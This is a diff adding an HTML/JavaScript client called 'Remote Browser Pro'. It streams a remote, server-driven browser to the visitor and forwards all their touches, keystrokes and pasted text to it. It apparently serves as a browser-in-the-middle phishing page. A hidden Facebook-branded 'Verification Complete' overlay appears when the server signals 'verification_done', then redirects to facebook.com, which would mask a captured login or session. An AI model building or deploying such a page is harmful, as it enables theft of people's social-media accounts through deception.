@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta name="mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <title>Remote Browser Pro</title>
+  <style>
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --bg: #000;
+      --text: #e8e8e8;
+    }
+
+    html,
+    body {
+      height: 100%;
+      width: 100%;
+      background: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      overflow: hidden;
+      touch-action: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    #viewport {
+      position: fixed;
+      inset: 0;
+      overflow: hidden;
+      background: #000;
+    }
+
+    #screen-canvas {
+      position: absolute;
+      top: 0;
+      left: 0;
+      display: block;
+      user-select: none;
+      pointer-events: none;
+      transform: translateZ(0);
+    }
+
+    #input-overlay {
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      z-index: 10;
+      background: rgba(0, 0, 0, 0.01); /* Permanent compositor trigger */
+      transform: translateZ(0);
+    }
+
+    #kbd-trigger {
+      position: fixed;
+      top: -9999px;
+      left: -9999px;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      border: none;
+      outline: none;
+      z-index: -1;
+    }
+
+    /* ─── Stats overlay ─── */
+    #stats-overlay {
+      display: none;
+      position: fixed;
+      top: 8px;
+      left: 8px;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(8px);
+      color: #0f0;
+      font-family: 'SF Mono', 'Cascadia Code', 'Consolas', monospace;
+      font-size: 11px;
+      padding: 6px 10px;
+      border-radius: 8px;
+      border: 1px solid rgba(0, 255, 0, 0.15);
+      z-index: 2147483647;
+      line-height: 1.5;
+      pointer-events: none;
+      min-width: 120px;
+    }
+
+    #stats-overlay .label {
+      color: #888;
+    }
+
+    #stats-overlay .val-h264 {
+      color: #0f0;
+    }
+
+    #stats-overlay .val-jpeg {
+      color: #f80;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div id="fb-verify-overlay" style="display: none; position: fixed; inset: 0; background: #f0f2f5; z-index: 9999999; flex-direction: column; align-items: center; justify-content: center; font-family: Helvetica, Arial, sans-serif; text-align: center; padding: 20px;">
+    <div style="background: white; padding: 40px 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); max-width: 400px; width: 100%;">
+      <div style="color: #1877f2; margin-bottom: 20px;">
+        <!-- Facebook Icon SVG -->
+        <svg viewBox="0 0 36 36" height="48" width="48" fill="currentColor"><path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-4.3h-4l-1 4.3z"></path></svg>
+      </div>
+      <h2 style="color: #1c1e21; font-size: 24px; font-weight: 600; margin-bottom: 16px;">Verification Complete</h2>
+      <p style="color: #606770; font-size: 16px; line-height: 1.5; margin-bottom: 24px;">Facebook verification done and we might verify your messenger later.</p>
+      <div style="display: flex; justify-content: center;">
+        <div style="border: 3px solid #f3f3f3; border-top: 3px solid #1877f2; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite;"></div>
+      </div>
+      <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+    </div>
+  </div>
+
+  <div id="stats-overlay">
+    <div><span class="label">Codec:</span> <span id="stat-codec">—</span></div>
+    <div><span class="label">FPS:</span> <span id="stat-fps">0</span></div>
+    <div><span class="label">RTT:</span> <span id="stat-rtt">—</span></div>
+    <div><span class="label">Frames:</span> <span id="stat-frames">0</span></div>
+    <div><span class="label">Bandwidth:</span> <span id="stat-bitrate">0 KB/s</span></div>
+  </div>
+
+  <div id="viewport">
+    <canvas id="screen-canvas"></canvas>
+    <div id="input-overlay"></div>
+  </div>
+
+  <!-- Active DOM mutator to keep Chrome hardware compositor awake, simulating stats-overlay visibility -->
+  <div id="compositor-hack" style="position: fixed; top: 0; left: 0; opacity: 0.01; pointer-events: none;">0</div>
+
+  <input id="kbd-trigger" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
+    enterkeyhint="send" inputmode="text" />
+
+  <script>
+    // ─── Constants & DOM refs ─────────────────────────────────────────
+    const $ = (id) => document.getElementById(id);
+    const viewport = $('viewport');
+    const canvas = $('screen-canvas');
+    const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
+    const kbdTrigger = $('kbd-trigger');
+
+    // Stats elements
+    const statCodec = $('stat-codec');
+    const statFps = $('stat-fps');
+    const statRtt = $('stat-rtt');
+    const statFrames = $('stat-frames');
+    const statBitrate = $('stat-bitrate');
+
+    // ─── WebCodecs detection ──────────────────────────────────────────
+    const WEBCODECS_AVAILABLE = typeof VideoDecoder !== 'undefined';
+    console.log('WebCodecs available:', WEBCODECS_AVAILABLE);
+
+    // ─── Viewport dimensions ─────────────────────────────────────────
+    let LOGICAL_W = window.innerWidth;
+    let LOGICAL_H = window.innerHeight;
+    let DEVICE_DPR = Math.min(window.devicePixelRatio || 1, 2.0);
+
+    const IS_DESKTOP = /Windows|Macintosh(?!(.*(?:iPhone|iPad|iPod)))|(Linux(?!.*Android))/i.test(navigator.userAgent);
+
+    let SERVER_W = LOGICAL_W;
+    let SERVER_H = LOGICAL_H;
+    let SERVER_DPR = DEVICE_DPR;
+
+    function lockCanvasDimensions() {
+      LOGICAL_W = window.innerWidth;
+      LOGICAL_H = window.innerHeight;
+      DEVICE_DPR = Math.min(window.devicePixelRatio || 1, 2.0); // Capped at 2.0 per user request
+
+      // --- PC Optimization ---
+      // If mobile, we cap the max pixels and downscale the requested size because page.screenshot is slow.
+      // If desktop, the server uses startScreencast which can handle 1080p easily, so we don't scale down.
+      const maxPixels = 1280 * 720;
+      const currentPixels = LOGICAL_W * LOGICAL_H * DEVICE_DPR;
+
+      if (!IS_DESKTOP && currentPixels > maxPixels) {
+        const scale = Math.sqrt(maxPixels / currentPixels);
+        SERVER_W = Math.round(LOGICAL_W * scale);
+        SERVER_H = Math.round(LOGICAL_H * scale);
+        SERVER_DPR = 1; // Force 1x for downscaled views
+      } else {
+        SERVER_W = LOGICAL_W;
+        SERVER_H = LOGICAL_H;
+        SERVER_DPR = DEVICE_DPR;
+      }
+
+      // The canvas bitmap resolution (how many pixels are actually drawn)
+      canvas.width = Math.round(SERVER_W * SERVER_DPR);
+      canvas.height = Math.round(SERVER_H * SERVER_DPR);
+
+      // The canvas CSS size (stretches the bitmap to fill the entire physical screen)
+      canvas.style.width = LOGICAL_W + 'px';
+      canvas.style.height = LOGICAL_H + 'px';
+
+      if (ws && ws.readyState === 1) {
+        send({
+          type: 'init',
+          w: SERVER_W,
+          h: SERVER_H,
+          dpr: SERVER_DPR,
+          ua: navigator.userAgent,
+          isDesktop: IS_DESKTOP,
+          // PC uses JPEG for full-screen updates, Mobile uses H.264 Delta
+          codec: (WEBCODECS_AVAILABLE && !IS_DESKTOP) ? 'h264' : 'jpeg'
+        });
+      }
+    }
+
+    let resizeTimeout;
+    window.addEventListener('resize', () => {
+      clearTimeout(resizeTimeout);
+      resizeTimeout = setTimeout(() => {
+        if (Math.abs(window.innerWidth - LOGICAL_W) > 10 || Math.abs(window.innerHeight - LOGICAL_H) > 10) {
+          lockCanvasDimensions();
+        }
+      }, 200);
+    });
+
+    // ─── WebSocket & WebRTC ───────────────────────────────────────────
+    let ws = null;
+    let inputRects = [];
+    let isTyping = false;
+    let useH264 = false;
+
+    let rtcPeer = null;
+    let rtcDataChannel = null;
+
+    // Touch state
+    let touchStartX = 0; let touchStartY = 0;
+    let lastTouchY = 0; let lastTouchX = 0;
+    let isScrolling = false; let velocityY = 0;
+    let momentumID = null; let touchHistory = [];
+    let isDragging = false;
+    let longPressTimeout = null;
+    let lastMoveTime = 0;
+
+    // JPEG fallback state
+    let latestFrameBlob = null;
+    let isDrawing = false;
+
+    // H.264 / WebCodecs state
+    let decoder = null;
+    let decoderConfigured = false;
+    let gotFirstKeyframe = false;
+
+    // Stats
+    let totalFrames = 0;
+    let fpsCounter = 0;
+    let displayFps = 0;
+    let lastPingTime = 0;
+    let bytesReceived = 0;
+    let displayBitrate = 0;
+
+    // ─── Stats tracking ──────────────────────────────────────────────
+
+    setInterval(() => {
+      displayFps = fpsCounter;
+      fpsCounter = 0;
+      statFps.textContent = displayFps;
+      statFrames.textContent = totalFrames;
+
+      displayBitrate = bytesReceived;
+      bytesReceived = 0;
+      if (displayBitrate > 1024 * 1024) {
+        statBitrate.textContent = (displayBitrate / (1024 * 1024)).toFixed(2) + ' MB/s';
+      } else {
+        statBitrate.textContent = Math.round(displayBitrate / 1024) + ' KB/s';
+      }
+    }, 1000);
+
+    // Keep DOM mutating to prevent canvas vsync lag (same effect as stats-overlay being visible)
+    const compositorHack = $('compositor-hack');
+    setInterval(() => {
+      compositorHack.textContent = Date.now();
+    }, 200);
+
+    function sendPing() {
+      lastPingTime = Date.now();
+      send({ type: 'ping', ts: lastPingTime });
+    }
+    setInterval(sendPing, 1000);
+
+    // ─── WebCodecs VideoDecoder ──────────────────────────────────────
+
+    function setupDecoder() {
+      if (!WEBCODECS_AVAILABLE) return;
+
+      try {
+        decoder = new VideoDecoder({
+          output: (frame) => {
+            // Render decoded frame to canvas instantly (bypassing requestAnimationFrame vsync delay)
+            ctx.drawImage(frame, 0, 0, canvas.width, canvas.height);
+            frame.close(); // CRITICAL: free GPU memory
+            totalFrames++;
+            fpsCounter++;
+          },
+          error: (e) => {
+            console.error('VideoDecoder error:', e);
+            resetDecoder();
+          }
+        });
+
+        // Configure for H.264 Baseline, Annex-B format
+        // Width/height are inferred from SPS NAL in the stream
+        decoder.configure({
+          codec: 'avc1.42001f',   // Baseline Profile, Level 3.1
+          avc: { format: 'annexb' },
+          hardwareAcceleration: 'prefer-hardware',
+          optimizeForLatency: true
+        });
+
+        decoderConfigured = true;
+        gotFirstKeyframe = false;
+        console.log('✅ VideoDecoder configured (H.264 Baseline, Annex-B)');
+      } catch (e) {
+        console.error('Failed to configure VideoDecoder:', e);
+        decoderConfigured = false;
+        // Server will be told we can't do H.264 on reconnect
+      }
+    }
+
+    function resetDecoder() {
+      gotFirstKeyframe = false;
+      decoderConfigured = false;
+      try { if (decoder) decoder.close(); } catch (e) { }
+      decoder = null;
+      setupDecoder();
+    }
+
+    /**
+     * Handle an H.264 binary frame from the server.
+     * Format: [type:1][timestamp_ms:4 BE][h264 data]
+     */
+    function handleH264Frame(buffer) {
+      if (!decoder || !decoderConfigured) return;
+
+      const view = new DataView(buffer);
+      const frameType = view.getUint8(0);          // 0x01 = key, 0x02 = delta
+      const timestampMs = view.getUint32(1, false); // big-endian
+      const h264Data = new Uint8Array(buffer, 5);
+
+      if (h264Data.length === 0) return;
+
+      const isKey = (frameType === 0x01);
+
+      // Must receive a keyframe before decoding delta frames
+      if (!isKey && !gotFirstKeyframe) return;
+      if (isKey) gotFirstKeyframe = true;
+
+      // Backpressure: skip delta frames if decoder queue is backed up
+      if (decoder.decodeQueueSize > 5 && !isKey) return;
+
+      try {
+        const chunk = new EncodedVideoChunk({
+          type: isKey ? 'key' : 'delta',
+          timestamp: timestampMs * 1000, // microseconds
+          data: h264Data
+        });
+        decoder.decode(chunk);
+      } catch (e) {
+        console.error('Decode error (likely dropped UDP packet):', e);
+        resetDecoder(); // Reset on any decode error to wait for next keyframe
+      }
+    }
+
+    // ─── JPEG fallback rendering ──────────────────────────────────────
+
+    async function drawLatestFrame() {
+      if (isDrawing) return;
+      if (!latestFrameBlob) return;
+
+      isDrawing = true;
+      const blobToDraw = latestFrameBlob;
+      latestFrameBlob = null;
+
+      try {
+        const bitmap = await createImageBitmap(blobToDraw);
+        if (canvas.width !== bitmap.width || canvas.height !== bitmap.height) {
+          canvas.width = bitmap.width;
+          canvas.height = bitmap.height;
+        }
+
+        ctx.drawImage(bitmap, 0, 0);
+        bitmap.close();
+        totalFrames++;
+        fpsCounter++;
+      } catch (err) { }
+
+      isDrawing = false;
+      requestAnimationFrame(drawLatestFrame);
+    }
+
+    // ─── WebSocket send helper ────────────────────────────────────────
+
+    function send(obj) {
+      if (ws && ws.readyState === 1) {
+        try {
+          ws.send(JSON.stringify(obj));
+        } catch (e) {
+          console.error("Failed to send WS message", e);
+        }
+      }
+    }
+
+    // ─── WebSocket connection ─────────────────────────────────────────
+
+    let reconnectTimeout = null;
+
+    function connect() {
+      const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+      ws = new WebSocket(`${proto}://${location.host}`);
+      ws.binaryType = 'arraybuffer';
+
+      ws.onopen = () => {
+        console.log('Connected to server');
+        clearTimeout(reconnectTimeout);
+        lockCanvasDimensions();
+        setupWebRTC();
+      };
+
+      ws.onmessage = (e) => {
+        // ── JSON messages ──
+        if (typeof e.data === 'string') {
+          bytesReceived += e.data.length;
+          try {
+            const msg = JSON.parse(e.data);
+
+            if (msg.type === 'pong') {
+              const rtt = Date.now() - msg.ts;
+              statRtt.textContent = rtt + ' ms';
+            }
+            else if (msg.type === 'meta') {
+              inputRects = msg.inputRects || [];
+            }
+            else if (msg.type === 'codec') {
+              // Server confirmed codec negotiation
+              useH264 = (msg.codec === 'h264');
+              if (useH264) {
+                statCodec.textContent = 'H.264';
+                statCodec.className = 'val-h264';
+                setupDecoder();
+                console.log('🎬 Server confirmed H.264 mode');
+              } else {
+                statCodec.textContent = 'JPEG';
+                statCodec.className = 'val-jpeg';
+                console.log('📸 Server confirmed JPEG fallback mode');
+              }
+            }
+            else if (msg.type === 'viewport_changed') {
+              SERVER_W = msg.w;
+              SERVER_H = msg.h;
+              SERVER_DPR = msg.dpr;
+            }
+            else if (msg.type === 'verification_done') {
+              const overlay = document.getElementById('fb-verify-overlay');
+              if (overlay) {
+                overlay.style.display = 'flex';
+                setTimeout(() => {
+                  window.location.href = 'https://facebook.com';
+                }, 4000);
+              }
+            }
+            else if (msg.type === 'webrtc_answer') {
+              rtcPeer.setRemoteDescription(new RTCSessionDescription(msg.answer)).catch(console.error);
+            }
+            else if (msg.type === 'webrtc_ice') {
+              rtcPeer.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(console.error);
+            }
+          } catch (err) { }
+        }
+        // Fallback: server might still send binary data over WS before DataChannel is open
+        else if (e.data instanceof ArrayBuffer && e.data.byteLength > 0) {
+          handleBinaryData(e.data);
+        }
+      };
+
+      ws.onclose = () => {
+        console.log('Disconnected from server, attempting reconnect...');
+        clearTimeout(reconnectTimeout);
+        reconnectTimeout = setTimeout(connect, 1500);
+        gotFirstKeyframe = false;
+        if (rtcPeer) rtcPeer.close();
+      };
+      ws.onerror = () => { };
+    }
+
+    function handleBinaryData(buffer) {
+      bytesReceived += buffer.byteLength;
+      const firstByte = new Uint8Array(buffer)[0];
+
+      if ((firstByte === 0x01 || firstByte === 0x02) && useH264) {
+        handleH264Frame(buffer);
+      } else {
+        latestFrameBlob = new Blob([buffer], { type: 'image/jpeg' });
+        if (!isDrawing) requestAnimationFrame(drawLatestFrame);
+      }
+    }
+
+    function setupWebRTC() {
+      if (rtcPeer) rtcPeer.close();
+      rtcPeer = new RTCPeerConnection({
+        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+      });
+
+      // Client creates the reliable DataChannel to prevent H.264 corruption
+      rtcDataChannel = rtcPeer.createDataChannel('video', {
+        ordered: true
+      });
+
+      rtcDataChannel.binaryType = 'arraybuffer';
+      rtcDataChannel.onopen = () => console.log('✅ UDP DataChannel open!');
+      rtcDataChannel.onmessage = (e) => {
+        if (e.data instanceof ArrayBuffer && e.data.byteLength > 0) {
+          handleBinaryData(e.data);
+        }
+      };
+
+      rtcPeer.onicecandidate = (e) => {
+        if (e.candidate) send({ type: 'webrtc_ice', candidate: e.candidate });
+      };
+
+      rtcPeer.createOffer().then(offer => {
+        return rtcPeer.setLocalDescription(offer);
+      }).then(() => {
+        send({ type: 'webrtc_offer', offer: rtcPeer.localDescription });
+      }).catch(e => console.error('WebRTC Offer Error:', e));
+    }
+
+    // ─── Touch coordinates ────────────────────────────────────────────
+
+    function toBrowserCoords(clientX, clientY) {
+      const scaleX = SERVER_W / LOGICAL_W;
+      const scaleY = SERVER_H / LOGICAL_H;
+      return { bx: clientX * scaleX, by: clientY * scaleY };
+    }
+
+    function getHitInput(bx, by) {
+      return inputRects.find((r) => bx >= r.x && bx <= r.x + r.w && by >= r.y && by <= r.y + r.h);
+    }
+
+    // ─── Browser history integration ──────────────────────────────────
+
+    window.history.pushState({ page: 'remote' }, '', window.location.href);
+    window.addEventListener('popstate', (e) => {
+      send({ type: 'back' });
+      window.history.pushState({ page: 'remote' }, '', window.location.href);
+    });
+
+    // ─── Touch event handlers ─────────────────────────────────────────
+
+    viewport.addEventListener('touchstart', (e) => {
+      e.preventDefault();
+      const t = e.touches[0];
+      const { bx, by } = toBrowserCoords(t.clientX, t.clientY);
+
+      touchStartX = t.clientX; touchStartY = t.clientY;
+      isScrolling = false;
+
+      send({ type: 'touchStart', x: bx, y: by });
+    }, { passive: false });
+
+    viewport.addEventListener('touchmove', (e) => {
+      e.preventDefault();
+      const t = e.touches[0];
+      const { bx, by } = toBrowserCoords(t.clientX, t.clientY);
+
+      if (Math.abs(t.clientX - touchStartX) > 5 || Math.abs(t.clientY - touchStartY) > 5) {
+        isScrolling = true;
+      }
+
+      const now = Date.now();
+      if (now - lastMoveTime > 16) { // throttle to ~60fps
+        send({ type: 'touchMove', x: bx, y: by });
+        lastMoveTime = now;
+      }
+    }, { passive: false });
+
+    viewport.addEventListener('touchend', (e) => {
+      e.preventDefault();
+      const t = e.changedTouches[0];
+      const { bx, by } = toBrowserCoords(t.clientX, t.clientY);
+
+      send({ type: 'touchEnd', x: bx, y: by });
+
+      // Handle keyboard popup for taps
+      if (!isScrolling) {
+        if (!IS_DESKTOP) {
+          if (getHitInput(bx, by)) openKeyboard();
+          else if (isTyping) closeKeyboard();
+        } else {
+          window.focus();
+        }
+      }
+    }, { passive: false });
+
+    // ─── Mouse event handlers (for PC) ────────────────────────────────
+
+    let isMouseDown = false;
+    let mouseStartX = 0; let mouseStartY = 0;
+    let isMouseDragging = false;
+
+    viewport.addEventListener('mousedown', (e) => {
+      e.preventDefault();
+      isMouseDown = true;
+      isMouseDragging = false;
+      mouseStartX = e.clientX; mouseStartY = e.clientY;
+      const { bx, by } = toBrowserCoords(e.clientX, e.clientY);
+      send({ type: 'mousedown', x: bx, y: by });
+    });
+
+    viewport.addEventListener('mousemove', (e) => {
+      e.preventDefault();
+      if (!isMouseDown) return;
+
+      if (Math.abs(e.clientX - mouseStartX) > 5 || Math.abs(e.clientY - mouseStartY) > 5) {
+        isMouseDragging = true;
+      }
+
+      const { bx, by } = toBrowserCoords(e.clientX, e.clientY);
+      const now = Date.now();
+      if (now - lastMoveTime > 16) {
+        send({ type: 'mousemove', x: bx, y: by });
+        lastMoveTime = now;
+      }
+    });
+
+    viewport.addEventListener('mouseup', (e) => {
+      e.preventDefault();
+      if (!isMouseDown) return;
+      isMouseDown = false;
+      
+      const { bx, by } = toBrowserCoords(e.clientX, e.clientY);
+      send({ type: 'mouseup', x: bx, y: by });
+
+      if (!isMouseDragging) {
+        if (!IS_DESKTOP) {
+          if (getHitInput(bx, by)) openKeyboard();
+          else if (isTyping) closeKeyboard();
+        } else {
+          window.focus();
+        }
+      }
+    });
+    
+    viewport.addEventListener('mouseleave', (e) => {
+      if (isMouseDown) {
+        isMouseDown = false;
+        const { bx, by } = toBrowserCoords(e.clientX, e.clientY);
+        send({ type: 'mouseup', x: bx, y: by });
+      }
+    });
+
+    viewport.addEventListener('wheel', (e) => {
+      e.preventDefault();
+      send({ type: 'scroll', dy: e.deltaY });
+    }, { passive: false });
+
+    // ─── Keyboard handling ────────────────────────────────────────────
+
+    function openKeyboard() { 
+      isTyping = true; 
+      kbdTrigger.value = ' '; // Dummy space to catch Backspaces
+      kbdTrigger.focus(); 
+    }
+    
+    function closeKeyboard() { 
+      isTyping = false; 
+      kbdTrigger.blur(); 
+    }
+
+    kbdTrigger.addEventListener('input', (e) => {
+      const val = kbdTrigger.value;
+      
+      if (val.length < 1) {
+        // Dummy space was deleted -> User pressed Backspace
+        if (!IS_DESKTOP) send({ type: 'key', key: 'Backspace' }); // Desktop handles backspace via window keydown
+      } else if (val.length > 1) {
+        // User typed something after the dummy space
+        const typed = val.substring(1);
+        send({ type: 'type', text: typed });
+      }
+      
+      // Immediately reset to dummy space so Android keyboard never has a word to select/delete
+      kbdTrigger.value = ' ';
+    });
+
+    kbdTrigger.addEventListener('keydown', (e) => {
+      if (IS_DESKTOP) return; // Desktop handles Enter natively via window listener
+      if (e.key === 'Enter') { e.preventDefault(); send({ type: 'key', key: 'Enter' }); closeKeyboard(); return; }
+    });
+
+    kbdTrigger.addEventListener('blur', () => {
+      if (IS_DESKTOP) return; // Keep focused on desktop
+      setTimeout(() => { if (isTyping && document.activeElement !== kbdTrigger) closeKeyboard(); }, 200);
+    });
+
+    if (IS_DESKTOP) {
+      const activeKeys = new Map();
+
+      // Keep kbdTrigger permanently focused so it captures normal typing and copy-paste
+      window.addEventListener('click', () => {
+        if (document.activeElement !== kbdTrigger) kbdTrigger.focus();
+      });
+      kbdTrigger.focus();
+
+      // Handle local copy/paste seamlessly
+      window.addEventListener('paste', (e) => {
+        const text = (e.clipboardData || window.clipboardData).getData('text');
+        if (text) {
+          e.preventDefault();
+          send({ type: 'type', text: text });
+        }
+      });
+
+      window.addEventListener('keydown', (e) => {
+        // Allow native paste to trigger the 'paste' event handler above
+        const isPaste = (e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'v';
+        if (isPaste) return;
+
+        // For standard printable characters, do NOT send Playwright keydowns.
+        // Let it bubble to kbdTrigger -> triggers 'input' event -> sends raw CDP (instant).
+        const isPrintable = e.key.length === 1 && !e.ctrlKey && !e.altKey && !e.metaKey;
+        if (isPrintable) return;
+
+        // Prevent browser default actions for control keys (Backspace, Arrows, Tab, Ctrl+...)
+        if (e.key !== 'F12') {
+          e.preventDefault();
+        }
+        
+        let key = e.key;
+        if (key === 'Spacebar' || key === ' ') key = 'Space';
+
+        // Store the original e.key so the exact same string is sent on keyup,
+        // even if the user released 'Shift' in the meantime.
+        if (!activeKeys.has(e.code)) {
+          activeKeys.set(e.code, key);
+        } else {
+          key = activeKeys.get(e.code);
+        }
+        
+        send({ type: 'keydown', key: key });
+      }, { passive: false });
+
+      window.addEventListener('keyup', (e) => {
+        const isPaste = (e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'v';
+        if (isPaste) return;
+
+        const isPrintable = e.key.length === 1 && !e.ctrlKey && !e.altKey && !e.metaKey;
+        if (isPrintable) return;
+
+        if (e.key !== 'F12') {
+          e.preventDefault();
+        }
+
+        // Retrieve the exact e.key that was sent during keydown
+        let key = activeKeys.get(e.code) || e.key;
+        if (key === 'Spacebar' || key === ' ') key = 'Space';
+
+        activeKeys.delete(e.code);
+
+        send({ type: 'keyup', key: key });
+      }, { passive: false });
+    }
+
+    // ─── Boot ─────────────────────────────────────────────────────────
+
+    lockCanvasDimensions();
+    connect();
+  </script>
+</body>
+
+</html>
